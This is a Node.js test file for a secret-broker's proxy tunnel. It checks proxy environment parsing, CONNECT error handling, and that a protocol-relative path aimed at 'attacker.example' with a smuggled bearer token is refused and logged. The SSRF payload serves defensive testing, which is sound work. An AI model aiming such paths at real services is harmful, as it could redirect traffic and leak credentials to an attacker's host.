import test from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import net from 'node:net';
import { proxyFor, tunneledConnection, upstreamRequestOptions } from '../src/proxy-tunnel.mjs';
import { SecretBroker } from '../src/index.mjs';
import { mkdtempSync, writeFileSync, chmodSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const LLM_KEY = 'sk-proj-tunnel-key-0001112223334445556677';
const TOKEN = 'tok-bot-core-aaaa';

function fixture() {
  const dir = mkdtempSync(join(tmpdir(), 'tunnel-test-'));
  writeFileSync(join(dir, 'enroll-bot-core'), TOKEN);
  writeFileSync(join(dir, 'llm-key'), LLM_KEY);
  writeFileSync(join(dir, 'mem-hmac-secret'), 'h');
  chmodSync(join(dir, 'llm-key'), 0o600);
  return dir;
}

/**
 * A TCP server that answers the CONNECT handshake with a fixed status line. Sockets are
 * tracked so `close()` really ends the process: `net.Server.close()` only stops listening,
 * and a lingering tunnel socket keeps `node --test` alive long enough to look like a hang.
 */
function fakeProxy(reply, { destroy = false, silent = false } = {}) {
  const requests = [];
  const sockets = new Set();
  const server = net.createServer((sock) => {
    sockets.add(sock);
    sock.on('error', () => {});
    let buffer = '';
    sock.on('data', (chunk) => {
      buffer += chunk.toString('latin1');
      if (!buffer.includes('\r\n\r\n')) return;
      requests.push(buffer.split('\r\n')[0]);
      if (destroy) return sock.destroy();
      if (silent) return; // swallow the CONNECT to exercise the client timeout
      sock.write(reply);
      sock.end();
    });
  });
  return {
    server,
    requests,
    listen: () => new Promise((r) => server.listen(0, '127.0.0.1', () => r(server.address().port))),
    close: () => {
      for (const sock of sockets) sock.destroy();
      sockets.clear();
      server.close();
    },
  };
}

test('proxyFor: reads HTTPS_PROXY, honours NO_PROXY, ignores junk', () => {
  assert.equal(proxyFor('api.deepseek.com', {}), null);
  assert.deepEqual(proxyFor('api.deepseek.com', { HTTPS_PROXY: 'http://p:3128' }), { hostname: 'p', port: 3128, proxyAuthorization: undefined });
  assert.equal(proxyFor('api.deepseek.com', { HTTPS_PROXY: 'p:3128' }).hostname, 'p');
  assert.equal(proxyFor('api.deepseek.com', { HTTPS_PROXY: 'http://user:pw@p:3128' }).proxyAuthorization, `Basic ${Buffer.from('user:pw').toString('base64')}`);
  assert.equal(proxyFor('api.deepseek.com', { HTTPS_PROXY: 'http://p:3128', NO_PROXY: 'api.deepseek.com' }), null);
  assert.equal(proxyFor('deepseek.internal.example', { HTTPS_PROXY: 'http://p:3128', NO_PROXY: '.internal.example,172.28.0.0/16' }), null);
  assert.equal(proxyFor('anything', { HTTPS_PROXY: 'http://p:3128', NO_PROXY: '*' }), null);
  assert.equal(proxyFor('api.deepseek.com', { HTTPS_PROXY: 'http://p:3128', NO_PROXY: 'localhost' }).hostname, 'p');
  assert.equal(proxyFor('x', { HTTPS_PROXY: '::::' }), null);
});

test('upstreamRequestOptions: tunnels only https, and only when a proxy applies', () => {
  const headers = { method: 'POST', hostname: 'api.deepseek.com', port: 443, path: '/v1/chat/completions', headers: {} };
  const direct = upstreamRequestOptions(new URL('http://127.0.0.1:9/v1/x'), headers, { HTTPS_PROXY: 'http://p:3128' });
  assert.equal(direct.via, 'direct');
  assert.equal(direct.options.createConnection, undefined);

  const proxied = upstreamRequestOptions(new URL('https://api.deepseek.com/v1/x'), headers, { HTTPS_PROXY: 'http://p:3128' });
  assert.equal(proxied.via, 'proxy:p:3128');
  assert.equal(typeof proxied.options.createConnection, 'function');

  const bypassed = upstreamRequestOptions(new URL('https://api.deepseek.com/v1/x'), headers, { HTTPS_PROXY: 'http://p:3128', NO_PROXY: 'api.deepseek.com' });
  assert.equal(bypassed.via, 'direct');
});

test('tunneledConnection: an allowlist refusal is reported as proxy-denied, not as an outage', async () => {
  const proxy = fakeProxy('HTTP/1.1 403 Forbidden\r\n\r\n');
  const port = await proxy.listen();
  const err = await new Promise((resolve) => {
    tunneledConnection({ hostname: 'api.deepseek.com', port: 443 }, { hostname: '127.0.0.1', port }, (e) => resolve(e));
  });
  assert.equal(err.egressReason, 'proxy-denied');
  assert.match(err.message, /refused CONNECT api.deepseek.com:443 \(403\)/);
  assert.deepEqual(proxy.requests, ['CONNECT api.deepseek.com:443 HTTP/1.1']);
  proxy.close();
});

test('tunneledConnection: a dead proxy socket is proxy-unreachable', async () => {
  const proxy = fakeProxy('', { destroy: true });
  const port = await proxy.listen();
  const err = await new Promise((resolve) => {
    tunneledConnection({ hostname: 'api.deepseek.com', port: 443 }, { hostname: '127.0.0.1', port }, (e) => resolve(e));
  });
  assert.equal(err.egressReason, 'proxy-unreachable');
  proxy.server.close();
});

test('tunneledConnection: CONNECT timeout fails closed instead of falling back to direct', async () => {
  const proxy = fakeProxy('HTTP/1.1 200 Connection established\r\n\r\n');
  // Silently swallow the CONNECT to force the timeout path.
  proxy.server.close();
  const silent = net.createServer(() => {});
  await new Promise((r) => silent.listen(0, '127.0.0.1', r));
  const port = silent.address().port;
  const err = await new Promise((resolve) => {
    tunneledConnection({ hostname: 'api.deepseek.com', port: 443 }, { hostname: '127.0.0.1', port }, (e) => resolve(e), { timeoutMs: 120 });
  });
  assert.equal(err.egressReason, 'proxy-unreachable');
  assert.match(err.message, /timed out/);
  silent.close();
});

test('broker: a protocol-relative path cannot aim the tunnel at another host (SSRF layer 2)', async () => {
  const dir = fixture();
  const auditPath = join(dir, 'tunnel-audit.jsonl');
  let upstreamHit = false;
  // The upstream answers, so the control call below completes; the SSRF attempt must
  // never reach it at all, which is what `upstreamHit` ordering proves.
  const upstream = createServer((req, res) => {
    upstreamHit = true;
    req.resume();
    req.on('end', () => {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ ok: true, sawAuthorization: req.headers.authorization || null }));
    });
  });
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  const broker = new SecretBroker({ secretsDir: dir, auditPath, upstreamBase: `http://127.0.0.1:${upstream.address().port}` });
  const main = broker.createServer();
  await new Promise((r) => main.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${main.address().port}`;

  const res = await fetch(`${base}/v1/llm//attacker.example/pwned`, {
    method: 'POST',
    headers: { 'x-broker-token': TOKEN, 'content-type': 'application/json', authorization: 'Bearer smuggled' },
    body: '{"model":"deepseek-flash"}',
  });
  assert.equal(res.status, 400);
  assert.equal((await res.json()).error.code, 'UPSTREAM_HOST_MISMATCH');
  assert.equal(upstreamHit, false, 'the broker must not open any connection to a non-upstream host');

  // Control: the legitimate path still works and the injected key reaches upstream.
  const ok = await fetch(`${base}/v1/llm/chat/completions`, { method: 'POST', headers: { 'x-broker-token': TOKEN, 'content-type': 'application/json', authorization: 'Bearer smuggled' }, body: '{}' });
  assert.equal(ok.status, 200);
  assert.equal(upstreamHit, true);
  const body = await ok.text();
  assert.match(body, /\"sawAuthorization\":\"Bearer sk-proj-tunnel/);
  assert.doesNotMatch(body, /smuggled/);

  const lines = readFileSync(auditPath, 'utf8').trim().split('\n').map(JSON.parse);
  const denied = lines.find((l) => l.type === 'sandbox.denied' && l.reason === 'upstream-host-mismatch');
  assert.equal(denied.stage, 'llm-egress');
  assert.equal(denied.targetHost, 'attacker.example');
  assert.match(readFileSync(auditPath, 'utf8'), /"via":"direct"/);
  assert.doesNotMatch(readFileSync(auditPath, 'utf8'), new RegExp(LLM_KEY));
  assert.doesNotMatch(readFileSync(auditPath, 'utf8'), /smuggled/);
  main.closeAllConnections();
  await new Promise((r) => main.close(r));
  upstream.closeAllConnections();
  await new Promise((r) => upstream.close(r));
});
